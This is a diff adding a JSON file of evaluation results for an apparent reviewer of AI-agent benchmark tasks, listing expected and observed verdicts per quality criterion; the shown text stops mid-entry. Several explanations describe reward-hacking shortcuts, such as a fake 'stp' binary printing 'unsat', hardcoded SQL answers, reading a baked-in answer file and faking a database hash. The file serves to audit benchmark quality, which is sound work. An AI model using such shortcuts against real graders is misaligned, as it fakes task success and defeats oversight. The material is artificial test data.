@@ -1,0 +1,2194 @@
+{
+  "groups": {
+    "upstream": {
+      "match": 101,
+      "mismatch": 36,
+      "labeled_comparisons": 137,
+      "accuracy_on_returned_labels": 0.7372262773722628,
+      "confusion": {
+        "fail->fail": 38,
+        "fail->pass": 18,
+        "pass->fail": 12,
+        "pass->pass": 63,
+        "pass->not_applicable": 6
+      }
+    },
+    "assumed_pass": {
+      "mismatch": 4,
+      "match": 5,
+      "labeled_comparisons": 9,
+      "accuracy_on_returned_labels": 0.5555555555555556,
+      "confusion": {
+        "pass->fail": 4,
+        "pass->pass": 5
+      }
+    },
+    "excluded": {
+      "excluded": 4,
+      "labeled_comparisons": 4,
+      "accuracy_on_returned_labels": null,
+      "confusion": {}
+    }
+  },
+  "tasks": [
+    {
+      "example": "fail-rubric-agentic",
+      "directory": "task-0001",
+      "group": "upstream",
+      "status": "findings",
+      "verdict_count": 1,
+      "reason": null
+    },
+    {
+      "example": "fail-rubric-anti-cheat",
+      "directory": "task-0002",
+      "group": "upstream",
+      "status": "findings",
+      "verdict_count": 1,
+      "reason": null
+    },
+    {
+      "example": "fail-rubric-artifact-efficiency",
+      "directory": "task-0003",
+      "group": "upstream",
+      "status": "findings",
+      "verdict_count": 1,
+      "reason": null
+    },
+    {
+      "example": "fail-rubric-deterministic",
+      "directory": "task-0004",
+      "group": "upstream",
+      "status": "findings",
+      "verdict_count": 1,
+      "reason": null
+    },
+    {
+      "example": "fail-rubric-essential-difficulty",
+      "directory": "task-0005",
+      "group": "upstream",
+      "status": "findings",
+      "verdict_count": 1,
+      "reason": null
+    },
+    {
+      "example": "fail-rubric-functional-verification",
+      "directory": "task-0006",
+      "group": "upstream",
+      "status": "findings",
+      "verdict_count": 1,
+      "reason": null
+    },
+    {
+      "example": "fail-rubric-instruction-concision",
+      "directory": "task-0007",
+      "group": "upstream",
+      "status": "findings",
+      "verdict_count": 1,
+      "reason": null
+    },
+    {
+      "example": "fail-rubric-instruction-concision-fluff",
+      "directory": "task-0008",
+      "group": "upstream",
+      "status": "findings",
+      "verdict_count": 1,
+      "reason": null
+    },
+    {
+      "example": "fail-rubric-interesting",
+      "directory": "task-0009",
+      "group": "upstream",
+      "status": "findings",
+      "verdict_count": 1,
+      "reason": null
+    },
+    {
+      "example": "fail-rubric-no-ctrf",
+      "directory": "task-0010",
+      "group": "upstream",
+      "status": "findings",
+      "verdict_count": 1,
+      "reason": null
+    },
+    {
+      "example": "fail-rubric-outcome-verified",
+      "directory": "task-0011",
+      "group": "upstream",
+      "status": "findings",
+      "verdict_count": 1,
+      "reason": null
+    },
+    {
+      "example": "fail-rubric-reviewable",
+      "directory": "task-0012",
+      "group": "upstream",
+      "status": "findings",
+      "verdict_count": 1,
+      "reason": null
+    },
+    {
+      "example": "fail-rubric-solution-quality",
+      "directory": "task-0013",
+      "group": "upstream",
+      "status": "findings",
+      "verdict_count": 1,
+      "reason": null
+    },
+    {
+      "example": "fail-rubric-solvable",
+      "directory": "task-0014",
+      "group": "upstream",
+      "status": "findings",
+      "verdict_count": 1,
+      "reason": null
+    },
+    {
+      "example": "fail-rubric-structured-schema",
+      "directory": "task-0015",
+      "group": "upstream",
+      "status": "findings",
+      "verdict_count": 1,
+      "reason": null
+    },
+    {
+      "example": "fail-rubric-test-alignment",
+      "directory": "task-0016",
+      "group": "upstream",
+      "status": "findings",
+      "verdict_count": 1,
+      "reason": null
+    },
+    {
+      "example": "fail-rubric-typos",
+      "directory": "task-0017",
+      "group": "upstream",
+      "status": "findings",
+      "verdict_count": 1,
+      "reason": null
+    },
+    {
+      "example": "fail-rubric-verifiable",
+      "directory": "task-0018",
+      "group": "upstream",
+      "status": "findings",
+      "verdict_count": 1,
+      "reason": null
+    },
+    {
+      "example": "fail-rubric-verifier-isolation",
+      "directory": "task-0019",
+      "group": "upstream",
+      "status": "findings",
+      "verdict_count": 1,
+      "reason": null
+    },
+    {
+      "example": "fail-rubric-resource-config",
+      "directory": "task-0020",
+      "group": "upstream",
+      "status": "findings",
+      "verdict_count": 1,
+      "reason": null
+    },
+    {
+      "example": "fail-rubric-no-extraneous-files",
+      "directory": "task-0021",
+      "group": "upstream",
+      "status": "findings",
+      "verdict_count": 1,
+      "reason": null
+    },
+    {
+      "example": "build-stp",
+      "directory": "task-0022",
+      "group": "upstream",
+      "status": "findings",
+      "verdict_count": 1,
+      "reason": null
+    },
+    {
+      "example": "build-stp--after",
+      "directory": "task-0049",
+      "group": "assumed_pass",
+      "status": "findings",
+      "verdict_count": 1,
+      "reason": null
+    },
+    {
+      "example": "query-optimize",
+      "directory": "task-0023",
+      "group": "upstream",
+      "status": "findings",
+      "verdict_count": 1,
+      "reason": null
+    },
+    {
+      "example": "query-optimize--after",
+      "directory": "task-0050",
+      "group": "assumed_pass",
+      "status": "findings",
+      "verdict_count": 1,
+      "reason": null
+    },
+    {
+      "example": "sanitize-git-repo",
+      "directory": "task-0024",
+      "group": "excluded",
+      "status": "findings",
+      "verdict_count": 1,
+      "reason": "PR 1034 does not change this task; the claimed git-history exploit has no verified reviewed version or fix for sanitize-git-repo."
+    },
+    {
+      "example": "install-windows-3.11",
+      "directory": "task-0025",
+      "group": "upstream",
+      "status": "findings",
+      "verdict_count": 1,
+      "reason": null
+    },
+    {
+      "example": "vimscript-vim-quine",
+      "directory": "task-0026",
+      "group": "excluded",
+      "status": "findings",
+      "verdict_count": 1,
+      "reason": "The upstream pass evidence is for large-scale-text-editing (PR 1175), not vimscript-vim-quine."
+    },
+    {
+      "example": "chess-best-move",
+      "directory": "task-0027",
+      "group": "excluded",
+      "status": "findings",
+      "verdict_count": 1,
+      "reason": "The Stockfish review concerns chess-beat-kendrick (PR 988), not the downloaded chess-best-move task."
+    },
+    {
+      "example": "password-recovery",
+      "directory": "task-0028",
+      "group": "excluded",
+      "status": "findings",
+      "verdict_count": 1,
+      "reason": "The /proc file-descriptor review concerns hack-hidden-password (PR 961), not password-recovery."
+    },
+    {
+      "example": "cartpole-rl-training",
+      "directory": "task-0029",
+      "group": "upstream",
+      "status": "findings",
+      "verdict_count": 1,
+      "reason": null
+    },
+    {
+      "example": "causal-inference-r",
+      "directory": "task-0030",
+      "group": "upstream",
+      "status": "findings",
+      "verdict_count": 1,
+      "reason": null
+    },
+    {
+      "example": "modernize-scientific-stack",
+      "directory": "task-0031",
+      "group": "upstream",
+      "status": "findings",
+      "verdict_count": 1,
+      "reason": null
+    },
+    {
+      "example": "modernize-scientific-stack--after",
+      "directory": "task-0051",
+      "group": "assumed_pass",
+      "status": "findings",
+      "verdict_count": 1,
+      "reason": null
+    },
+    {
+      "example": "form-filling",
+      "directory": "task-0032",
+      "group": "upstream",
+      "status": "findings",
+      "verdict_count": 1,
+      "reason": null
+    },
+    {
+      "example": "form-filling--after",
+      "directory": "task-0052",
+      "group": "assumed_pass",
+      "status": "findings",
+      "verdict_count": 1,
+      "reason": null
+    },
+    {
+      "example": "mailman",
+      "directory": "task-0033",
+      "group": "upstream",
+      "status": "findings",
+      "verdict_count": 1,
+      "reason": null
+    },
+    {
+      "example": "mailman--after",
+      "directory": "task-0053",
+      "group": "assumed_pass",
+      "status": "findings",
+      "verdict_count": 1,
+      "reason": null
+    },
+    {
+      "example": "protocol-analysis-rs",
+      "directory": "task-0034",
+      "group": "upstream",
+      "status": "findings",
+      "verdict_count": 1,
+      "reason": null
+    },
+    {
+      "example": "protocol-analysis-rs--after",
+      "directory": "task-0054",
+      "group": "assumed_pass",
+      "status": "findings",
+      "verdict_count": 1,
+      "reason": null
+    },
+    {
+      "example": "mcmc-sampling-stan",
+      "directory": "task-0035",
+      "group": "upstream",
+      "status": "findings",
+      "verdict_count": 1,
+      "reason": null
+    },
+    {
+      "example": "mcmc-sampling-stan--after",
+      "directory": "task-0055",
+      "group": "assumed_pass",
+      "status": "findings",
+      "verdict_count": 1,
+      "reason": null
+    },
+    {
+      "example": "financial-document-processor",
+      "directory": "task-0036",
+      "group": "upstream",
+      "status": "findings",
+      "verdict_count": 1,
+      "reason": null
+    },
+    {
+      "example": "financial-document-processor--after",
+      "directory": "task-0056",
+      "group": "assumed_pass",
+      "status": "findings",
+      "verdict_count": 1,
+      "reason": null
+    },
+    {
+      "example": "winning-avg-corewars",
+      "directory": "task-0037",
+      "group": "upstream",
+      "status": "findings",
+      "verdict_count": 1,
+      "reason": null
+    },
+    {
+      "example": "winning-avg-corewars--after",
+      "directory": "task-0057",
+      "group": "assumed_pass",
+      "status": "findings",
+      "verdict_count": 1,
+      "reason": null
+    },
+    {
+      "example": "train-fasttext",
+      "directory": "task-0038",
+      "group": "upstream",
+      "status": "findings",
+      "verdict_count": 1,
+      "reason": null
+    },
+    {
+      "example": "mteb-retrieve",
+      "directory": "task-0039",
+      "group": "upstream",
+      "status": "findings",
+      "verdict_count": 1,
+      "reason": null
+    },
+    {
+      "example": "build-linux-kernel-qemu",
+      "directory": "task-0040",
+      "group": "upstream",
+      "status": "findings",
+      "verdict_count": 1,
+      "reason": null
+    },
+    {
+      "example": "prove-plus-comm",
+      "directory": "task-0041",
+      "group": "upstream",
+      "status": "findings",
+      "verdict_count": 1,
+      "reason": null
+    },
+    {
+      "example": "raman-fitting",
+      "directory": "task-0042",
+      "group": "upstream",
+      "status": "findings",
+      "verdict_count": 1,
+      "reason": null
+    },
+    {
+      "example": "cron-broken-network",
+      "directory": "task-0043",
+      "group": "upstream",
+      "status": "findings",
+      "verdict_count": 1,
+      "reason": null
+    },
+    {
+      "example": "extract-moves-from-video",
+      "directory": "task-0044",
+      "group": "upstream",
+      "status": "findings",
+      "verdict_count": 1,
+      "reason": null
+    },
+    {
+      "example": "nginx-request-logging",
+      "directory": "task-0045",
+      "group": "upstream",
+      "status": "findings",
+      "verdict_count": 1,
+      "reason": null
+    },
+    {
+      "example": "sqlite-with-gcov",
+      "directory": "task-0046",
+      "group": "upstream",
+      "status": "findings",
+      "verdict_count": 1,
+      "reason": null
+    },
+    {
+      "example": "fail-rubric-do-not-modify",
+      "directory": "task-0047",
+      "group": "upstream",
+      "status": "findings",
+      "verdict_count": 1,
+      "reason": null
+    },
+    {
+      "example": "fail-rubric-task-security",
+      "directory": "task-0048",
+      "group": "upstream",
+      "status": "findings",
+      "verdict_count": 1,
+      "reason": null
+    }
+  ],
+  "comparisons": [
+    {
+      "example": "fail-rubric-agentic",
+      "directory": "task-0001",
+      "attempt": 1,
+      "group": "upstream",
+      "criterion": "agentic",
+      "expected": "fail",
+      "observed": "fail",
+      "result": "match",
+      "explanation": "This task (write a two-line function, compute 3+4, write to a file) is trivially solvable in a single zero-shot generation with no exploration, debugging, or multi-step environment interaction required."
+    },
+    {
+      "example": "fail-rubric-anti-cheat",
+      "directory": "task-0002",
+      "attempt": 1,
+      "group": "upstream",
+      "criterion": "anti_cheat_robustness",
+      "expected": "fail",
+      "observed": "fail",
+      "result": "match",
+      "explanation": "environment/Dockerfile bakes the precomputed answer directly into the agent's image at /app/.secret-answer.txt, so the agent can trivially cat the answer instead of computing it \u2014 the ground truth is embedded in the agent-accessible filesystem."
+    },
+    {
+      "example": "fail-rubric-artifact-efficiency",
+      "directory": "task-0003",
+      "attempt": 1,
+      "group": "upstream",
+      "criterion": "artifact_efficiency",
+      "expected": "fail",
+      "observed": "fail",
+      "result": "match",
+      "explanation": "The reference dataset is fixed at build time (seeded RNG) yet is shipped wholesale as part of the /app artifact on every trial instead of being baked into tests/Dockerfile as a pristine baseline; the environment/Dockerfile comment itself acknowledges this deviation from the preferred approach."
+    },
+    {
+      "example": "fail-rubric-deterministic",
+      "directory": "task-0004",
+      "attempt": 1,
+      "group": "upstream",
+      "criterion": "deterministic_reproducible",
+      "expected": "fail",
+      "observed": "fail",
+      "result": "match",
+      "explanation": "Both the solution and verifier depend on live external network services (httpbin.org for data, astral.sh for installing uv) that are not stable/pinned infrastructure like a package registry, so availability or behavior changes could break runs unpredictably."
+    },
+    {
+      "example": "fail-rubric-essential-difficulty",
+      "directory": "task-0005",
+      "attempt": 1,
+      "group": "upstream",
+      "criterion": "essential_difficulty",
+      "expected": "fail",
+      "observed": "fail",
+      "result": "match",
+      "explanation": "The entire difficulty of the task is clerical/formatting (exact 4-space indentation, exact trailing newline, no trailing spaces) via a byte-for-byte string comparison in test_exact_whitespace, not genuine reasoning or algorithmic work."
+    },
+    {
+      "example": "fail-rubric-functional-verification",
+      "directory": "task-0006",
+      "attempt": 1,
+      "group": "upstream",
+      "criterion": "functional_verification",
+      "expected": "fail",
+      "observed": "fail",
+      "result": "match",
+      "explanation": "The test file's own docstrings admit it 'Checks for function name via string matching instead of importing and calling it' and 'Checks for n * 2 in source instead of testing the actual behavior' \u2014 this is the textbook violation this criterion targets."
+    },
+    {
+      "example": "fail-rubric-instruction-concision",
+      "directory": "task-0007",
+      "attempt": 1,
+      "group": "upstream",
+      "criterion": "instruction_concision",
+      "expected": "fail",
+      "observed": "fail",
+      "result": "match",
+      "explanation": "The instruction explicitly provides a numbered step-by-step procedure (which functions to call, loop structure, variable names, file modes) rather than describing only the desired end state, directly hinting at the solution approach."
+    },
+    {
+      "example": "fail-rubric-instruction-concision-fluff",
+      "directory": "task-0008",
+      "attempt": 1,
+      "group": "upstream",
+      "criterion": "instruction_concision",
+      "expected": "fail",
+      "observed": "fail",
+      "result": "match",
+      "explanation": "The instruction opens with unnecessary roleplay fluff ('You are a data processing specialist. Your mission is...') and lists available tools/libraries ('Python 3, numpy, pandas') that aren't needed for the task and should be left for the agent to discover, both of which the guidance explicitly flags as issues."
+    },
+    {
+      "example": "fail-rubric-interesting",
+      "directory": "task-0009",
+      "attempt": 1,
+      "group": "upstream",
+      "criterion": "interesting",
+      "expected": "fail",
+      "observed": "fail",
+      "result": "match",
+      "explanation": "Counting occurrences of a letter in a short hardcoded string has no real-world professional utility; the task.toml's own metadata (author 'Test Suite', explanations stating 'Test task for QA pipeline') confirms this is a pipeline/canary test fixture rather than a genuine benchmark task."
+    },
+    {
+      "example": "fail-rubric-no-ctrf",
+      "directory": "task-0010",
+      "attempt": 1,
+      "group": "upstream",
+      "criterion": "ctrf_reporting",
+      "expected": "fail",
+      "observed": "fail",
+      "result": "match",
+      "explanation": "tests/test.sh explicitly runs pytest without the --ctrf flag (its own comment states 'Runs pytest without --ctrf: only a bare reward is reported'), discarding per-test granularity that the pytest-based verifier could trivially provide."
+    },
+    {
+      "example": "fail-rubric-outcome-verified",
+      "directory": "task-0011",
+      "attempt": 1,
+      "group": "upstream",
+      "criterion": "outcome_verified",
+      "expected": "fail",
+      "observed": "fail",
+      "result": "match",
+      "explanation": "test_must_use_sed enforces that the specific tool `sed` was used (via shell history inspection) rather than grading only the end state of the file, which is exactly the 'must use emacs/vim' anti-pattern the rubric calls out as disallowed process-based grading."
+    },
+    {
+      "example": "fail-rubric-reviewable",
+      "directory": "task-0012",
+      "attempt": 1,
+      "group": "upstream",
+      "criterion": "reviewable",
+      "expected": "fail",
+      "observed": "fail",
+      "result": "match",
+      "explanation": "The expected value in tests/test_state.py is hardcoded with no derivation (the file's own comment states this explicitly: \"Hardcoded expected value with no derivation or explanation of where it comes from\"), and task.toml's explanation fields are generic placeholders (\"Test task for QA pipeline\") rather than domain justification, making it impossible for a non-specialist (or specialist) reviewer to verify correctness."
+    },
+    {
+      "example": "fail-rubric-solution-quality",
+      "directory": "task-0013",
+      "attempt": 1,
+      "group": "upstream",
+      "criterion": "solution_quality",
+      "expected": "fail",
+      "observed": "fail",
+      "result": "match",
+      "explanation": "solution/solve.sh explicitly hardcodes the final answer ('# Hardcoded answer instead of actually parsing the CSV' followed by `echo \"60\" > /app/total.txt`) instead of performing any actual CSV parsing or computation."
+    },
+    {
+      "example": "fail-rubric-solvable",
+      "directory": "task-0014",
+      "attempt": 1,
+      "group": "upstream",
+      "criterion": "solvable",
+      "expected": "fail",
+      "observed": "fail",
+      "result": "match",
+      "explanation": "The provided solution (solution/solve.sh) explicitly does nothing ('this solution does nothing because the task is impossible') and would fail test_pi_file_exists since /app/pi.txt is never created; the task itself (exact 10-billion-digit pi expansion in under 1 second with only the stdlib) is computationally infeasible on the given 1-CPU/2GB/120s-timeout environment."
+    },
+    {
+      "example": "fail-rubric-structured-schema",
+      "directory": "task-0015",
+      "attempt": 1,
+      "group": "upstream",
+      "criterion": "structured_data_schema",
+      "expected": "fail",
+      "observed": "fail",
+      "result": "match",
+      "explanation": "The instruction only says to write 'a JSON summary' without documenting any schema, yet the verifier requires specific undocumented keys (line_count, char_count) with specific values."
+    },
+    {
+      "example": "fail-rubric-test-alignment",
+      "directory": "task-0016",
+      "attempt": 1,
+      "group": "upstream",
+      "criterion": "test_instruction_alignment",
+      "expected": "fail",
+      "observed": "fail",
+      "result": "match",
+      "explanation": "instruction.md requires five functions (uppercase, lowercase, titlecase, word_count, char_count) but test_state.py only tests uppercase and lowercase, with its own docstrings explicitly admitting 'Only tests 1 of the 5 functions' and 'Only tests 2 of the 5 functions' \u2014 titlecase, word_count, and char_count have zero test coverage."
+    },
+    {
+      "example": "fail-rubric-typos",
+      "directory": "task-0017",
+      "attempt": 1,
+      "group": "upstream",
+      "criterion": "typos",
+      "expected": "fail",
+      "observed": "fail",
+      "result": "match",
+      "explanation": "instruction.md contains clear typos: 'nubmer' (number), 'ttal' (total), and 'comand' (command)."
+    },
+    {
+      "example": "fail-rubric-verifiable",
+      "directory": "task-0018",
+      "attempt": 1,
+      "group": "upstream",
+      "criterion": "verifiable",
+      "expected": "fail",
+      "observed": "fail",
+      "result": "match",
+      "explanation": "The sole test asserts `random.random() > 0.5` with no fixed seed, so the verdict for the exact same submission is a coin flip; re-running hundreds of times would show roughly 50% failures even for a correct solution, which is the opposite of deterministic/reliable verification."
+    },
+    {
+      "example": "fail-rubric-verifier-isolation",
+      "directory": "task-0019",
+      "attempt": 1,
+      "group": "upstream",
+      "criterion": "verifier_execution_isolation",
+      "expected": "fail",
+      "observed": "fail",
+      "result": "match",
+      "explanation": "test_state.py runs the agent-produced wordcount.py via subprocess inside the root-run pytest process with no privilege drop (no setpriv/unprivileged user), and the comment confirms /logs/verifier is left world-writable before this execution, so the reward channel is not protected from agent-controlled code."
+    },
+    {
+      "example": "fail-rubric-resource-config",
+      "directory": "task-0020",
+      "attempt": 1,
+      "group": "upstream",
+      "criterion": "resource_configuration",
+      "expected": "fail",
+      "observed": "fail",
+      "result": "match",
+      "explanation": "task.toml allocates 65536 MB of memory and 4 GPUs (plus a 1-hour agent timeout) for a task that only sorts 5 words of text and uses none of that compute, which is a severe, unjustified mismatch between resources and the task's actual (trivial) needs."
+    },
+    {
+      "example": "fail-rubric-no-extraneous-files",
+      "directory": "task-0021",
+      "attempt": 1,
+      "group": "upstream",
+      "criterion": "no_extraneous_files",
+      "expected": "fail",
+      "observed": "fail",
+      "result": "match",
+      "explanation": "scratch_notes.txt is present in the task directory and its own content states 'nothing references this file' \u2014 it is leftover authoring debris not used by any Dockerfile, instruction, solution, or test."
+    },
+    {
+      "example": "build-stp",
+      "directory": "task-0022",
+      "attempt": 1,
+      "group": "upstream",
+      "criterion": "anti_cheat_robustness",
+      "expected": "fail",
+      "observed": "fail",
+      "result": "match",
+      "explanation": "The sole test invokes `stp` on one fixed satisfiable query and checks only for exit code 0 and the substring 'sat' in stdout; an agent could trivially place a fake `stp` script on PATH that unconditionally prints 'sat' and exits 0, bypassing the actual build entirely."
+    },
+    {
+      "example": "build-stp--after",
+      "directory": "task-0049",
+      "attempt": 1,
+      "group": "assumed_pass",
+      "criterion": "anti_cheat_robustness",
+      "expected": "pass",
+      "observed": "fail",
+      "result": "mismatch",
+      "explanation": "Because every test's assertion checks `\"sat\" in result.stdout` or `\"unsat\" in result.stdout`, and the substring \"sat\" is contained within the string \"unsat\", a trivial fake `stp` script that always prints `unsat` and exits 0 passes all 7 tests without building or even invoking the real STP solver \u2014 a severe, easily-discovered shortcut that defeats the entire build task."
+    },
+    {
+      "example": "query-optimize",
+      "directory": "task-0023",
+      "attempt": 1,
+      "group": "upstream",
+      "criterion": "anti_cheat_robustness",
+      "expected": "fail",
+      "observed": "fail",
+      "result": "match",
+      "explanation": "Nothing in the tests requires the submitted query to actually reference the underlying words/senses/synsets tables or avoid literal values; an agent could compute the 100-row answer once (via the read-only DB, which is legitimately queryable) and hardcode it as a single `SELECT ... UNION ALL ...` of literal values in /app/sol.sql, trivially satisfying the single-SELECT-statement check, the exact output match, and the performance threshold (a literal-values query is at least as fast as golden) without performing any real optimization."
+    },
+    {
+      "example": "query-optimize--after",
+      "directory": "task-0050",
+      "attempt": 1,
+      "group": "assumed_pass",
+      "criterion": "anti_cheat_robustness",
+      "expected": "pass",
+      "observed": "pass",
+      "result": "match",
+      "explanation": "The database is chmod 444'd and its sha256 hash is checked post-hoc, the golden query lives only under tests/ (not shipped to the agent image), and the single-statement/no-comment check explicitly guards against the documented reward-hack vector of creating and dropping temp tables to fake the DB hash."
+    },
+    {
+      "example": "sanitize-git-repo",
+      "directory": "task-0024",
+      "attempt": 1,
+      "group": "excluded",
+      "criterion": "anti_cheat_robustness",
+      "expected": "fail",
+      "observed": "pass",
+      "result": "excluded",
+      "explanation": "The tests/ directory (containing the decontaminated reference files and the known-secret constants) is not COPY'd into the environment Dockerfile, so the agent cannot read the ground truth during the task. The remote repo has only a single branch at the contaminated commit, so there is no newer 'already-fixed' commit the agent could fetch to shortcut the task."
+    },
+    {
+      "example": "install-windows-3.11",
+      "directory": "task-0025",
+      "attempt": 1,
+      "group": "upstream",
+      "criterion": "test_instruction_alignment",
+      "expected": "fail",
+      "observed": "fail",
+      "result": "match",
+      "explanation": "The test's keyboard-control check requires an undocumented, specific monitor socket path and HMP 'sendkey' protocol that the instruction never mentions, so an agent satisfying the stated requirement via a different (equally valid) keyboard-injection mechanism would fail verification."
+    },
+    {
+      "example": "vimscript-vim-quine",
+      "directory": "task-0026",
+      "attempt": 1,
+      "group": "excluded",
+      "criterion": "anti_cheat_robustness",
+      "expected": "pass",
+      "observed": "pass",
+      "result": "excluded",
+      "explanation": "Tests dynamically create temp directories/files and check functional state (tab count, window count, buffer names, winlayout topology) after sourcing the generated output, so static or hardcoded output cannot satisfy the varying scenarios across test cases. No ground-truth data is exposed to the agent."
+    },
+    {
+      "example": "chess-best-move",
+      "directory": "task-0027",
+      "attempt": 1,
+      "group": "excluded",
+      "criterion": "anti_cheat_robustness",
+      "expected": "fail",
+      "observed": "pass",
+      "result": "excluded",
+      "explanation": "The FEN used to build the puzzle is embedded only in make.py, which is deleted in a later Dockerfile RUN step before the task starts; the agent's filesystem only contains chess_board.png with no accessible plaintext record of the underlying position or answer, and the tests/ directory is not mounted into the agent's container."
+    },
+    {
+      "example": "password-recovery",
+      "directory": "task-0028",
+      "attempt": 1,
+      "group": "excluded",
+      "criterion": "anti_cheat_robustness",
+      "expected": "fail",
+      "observed": "pass",
+      "result": "excluded",
+      "explanation": "The password-creation logic is only present in setup.sh, which is COPY'd and then deleted within a later RUN layer of the Dockerfile before the agent's container starts; the final filesystem the agent sees never contains launchcode.txt, secret.zip, or setup.sh, and the fragments are deliberately split and separated by ~1-2MB of noise so a naive `strings`/`grep` over the image cannot trivially recover the contiguous password."
+    },
+    {
+      "example": "cartpole-rl-training",
+      "directory": "task-0029",
+      "attempt": 1,
+      "group": "upstream",
+      "criterion": "anti_cheat_robustness",
+      "expected": "fail",
+      "observed": "pass",
+      "result": "mismatch",
+      "explanation": "The actual scoring script (tests/test_outputs.py) is not exposed to the agent during solving \u2014 only a similar but distinct example script (task-deps/test.py) is provided, as the instruction states \u2014 and no ground-truth/oracle data is baked into the agent image, so there is no trivial shortcut to the scored evaluation."
+    },
+    {
+      "example": "causal-inference-r",
+      "directory": "task-0030",
+      "attempt": 1,
+      "group": "upstream",
+      "criterion": "anti_cheat_robustness",
+      "expected": "fail",
+      "observed": "pass",
+      "result": "mismatch",
+      "explanation": "The true ATE (2.75) and the valid adjustment sets are only known to the test file and solution.sh, neither of which is visible to the agent; the agent cannot derive 2.75 without doing real adjustment (I confirmed a naive full-covariate regression gives ~1.7-2.0, far outside the 0.02 tolerance), so there's no trivial shortcut to the right file contents."
+    },
+    {
+      "example": "causal-inference-r",
+      "directory": "task-0030",
+      "attempt": 1,
+      "group": "upstream",
+      "criterion": "functional_verification",
+      "expected": "fail",
+      "observed": "pass",
+      "result": "mismatch",
+      "explanation": "The decisive checks (ATE numeric accuracy derived from file content, and R/dagitty/data.table package availability via subprocess execution) are functional; one secondary test does keyword-scan the notebook source for causal-inference-related terms, which is a minor weakness but not the primary basis for grading."
+    },
+    {
+      "example": "modernize-scientific-stack",
+      "directory": "task-0031",
+      "attempt": 1,
+      "group": "upstream",
+      "criterion": "functional_verification",
+      "expected": "fail",
+      "observed": "fail",
+      "result": "match",
+      "explanation": "test_comprehensive_api_modernization relies almost entirely on substring/keyword scanning of source files (checking for '.ix[', 'np.int', 'print ', 'xrange(', exact 'encoding=\\'utf-8\\'' strings, 'from configparser import', etc.) rather than executing and checking behavior; I confirmed a trivial quote-style change (single vs double quotes) that doesn't alter behavior would flip this test's verdict."
+    },
+    {
+      "example": "modernize-scientific-stack--after",
+      "directory": "task-0051",
+      "attempt": 1,
+      "group": "assumed_pass",
+      "criterion": "functional_verification",
+      "expected": "pass",
+      "observed": "pass",
+      "result": "match",
+      "explanation": "test_outputs.py actually executes the agent's script via subprocess and parses its stdout for the computed values, and checks file existence/exit code, rather than grepping the agent's source code for keywords."
+    },
+    {
+      "example": "form-filling",
+      "directory": "task-0032",
+      "attempt": 1,
+      "group": "upstream",
+      "criterion": "functional_verification",
+      "expected": "fail",
+      "observed": "pass",
+      "result": "mismatch",
+      "explanation": "Tests execute/read the produced JSON output and, when necessary, run the agent's script as a subprocess rather than grepping the agent's source code for keywords or patterns."
+    },
+    {
+      "example": "form-filling--after",
+      "directory": "task-0052",
+      "attempt": 1,
+      "group": "assumed_pass",
+      "criterion": "functional_verification",
+      "expected": "pass",
+      "observed": "pass",
+      "result": "match",
+      "explanation": "Tests execute the agent's script via subprocess and parse the resulting JSON file rather than grepping source code or keywords, even though the checks performed on that output are shallow."
+    },
+    {
+      "example": "mailman",
+      "directory": "task-0033",
+      "attempt": 1,
+      "group": "upstream",
+      "criterion": "deterministic_reproducible",
+      "expected": "fail",
+      "observed": "pass",
+      "result": "mismatch",
+      "explanation": "Verifier-side Python dependencies (uv, pytest, mailman) are version-pinned; the agent-side apt packages (postfix, mailman3) are unpinned but apt is treated as stable infrastructure per the guidance, so this does not violate the determinism bar on its own (network-install flakiness is captured separately under verifiable)."
+    },
+    {
+      "example": "mailman--after",
+      "directory": "task-0053",
+      "attempt": 1,
+      "group": "assumed_pass",
+      "criterion": "deterministic_reproducible",
+      "expected": "pass",
+      "observed": "pass",
+      "result": "match",
+      "explanation": "All installed package versions are explicitly pinned (postfix, mailutils, mailman3 in the Dockerfile; uv, pytest, mailman in run-tests.sh), and no task-relevant mutable live service is consulted; results should be consistent run to run aside from the network-install reliability concern already captured under verifiable."
+    },
+    {
+      "example": "protocol-analysis-rs",
+      "directory": "task-0034",
+      "attempt": 1,
+      "group": "upstream",
+      "criterion": "deterministic_reproducible",
+      "expected": "fail",
+      "observed": "fail",
+      "result": "match",
+      "explanation": "The test uses fixed sleeps (300s for server boot, 70s after login) with no readiness polling, and re-clones the server from a live GitHub service on every run; slower hardware or transient network conditions during either step can cause spurious failures of an otherwise-correct solution."
+    },
+    {
+      "example": "protocol-analysis-rs--after",
+      "directory": "task-0054",
+      "attempt": 1,
+      "group": "assumed_pass",
+      "criterion": "deterministic_reproducible",
+      "expected": "pass",
+      "observed": "fail",
+      "result": "mismatch",
+      "explanation": "Engine-TS/Content/Client-TS/Client-Java are cloned by mutable branch ref ('244') rather than a pinned commit, so upstream pushes to that branch can change build/runtime behavior between trials; combined with the live multi-repo clone-and-build at verify time, results are not guaranteed consistent across runs."
+    },
+    {
+      "example": "mcmc-sampling-stan",
+      "directory": "task-0035",
+      "attempt": 1,
+      "group": "upstream",
+      "criterion": "deterministic_reproducible",
+      "expected": "fail",
+      "observed": "fail",
+      "result": "match",
+      "explanation": "tests/setup injects CXX14FLAGS=-O3 -march=native -mtune=native when compiling RStan/StanHeaders, which can yield hardware-dependent floating-point behavior over a long NUTS chain, and the full 100k-iteration x4-chain sampling is re-executed from scratch twice more during verification, risking drift outside the narrow accepted numeric ranges on different hardware."
+    },
+    {
+      "example": "mcmc-sampling-stan--after",
+      "directory": "task-0055",
+      "attempt": 1,
+      "group": "assumed_pass",
+      "criterion": "deterministic_reproducible",
+      "expected": "pass",
+      "observed": "pass",
+      "result": "match",
+      "explanation": "Although the recommended Makevars use -march=native and the Stan seed is set implicitly via R's set.seed(1) rather than passed explicitly to sampling(), the instructed very large iteration count (100,000 per chain x4) is specifically sized to shrink Monte Carlo error so the posterior mean should be stable across machines/seeds within the given tolerance bands."
+    },
+    {
+      "example": "financial-document-processor",
+      "directory": "task-0036",
+      "attempt": 1,
+      "group": "upstream",
+      "criterion": "reviewable",
+      "expected": "fail",
+      "observed": "pass",
+      "result": "mismatch",
+      "explanation": "document_labels.json documents the ground truth, and sample documents inspected directly (41ibljh7.pdf, 8mdd4v30.jpg) show clearly labeled totals/VAT that a non-specialist reviewer can visually confirm without needing specialized domain expertise."
+    },
+    {
+      "example": "financial-document-processor--after",
+      "directory": "task-0056",
+      "attempt": 1,
+      "group": "assumed_pass",
+      "criterion": "reviewable",
+      "expected": "pass",
+      "observed": "fail",
+      "result": "mismatch",
+      "explanation": "The per-file expected total_amount/vat_amount values in tests/test_outputs.py are hardcoded and explicitly commented as being 'based on document_labels.json', but no such file is included anywhere in the task directory, leaving a non-specialist reviewer no way to verify how the ground truth was derived."
+    },
+    {
+      "example": "winning-avg-corewars",
+      "directory": "task-0037",
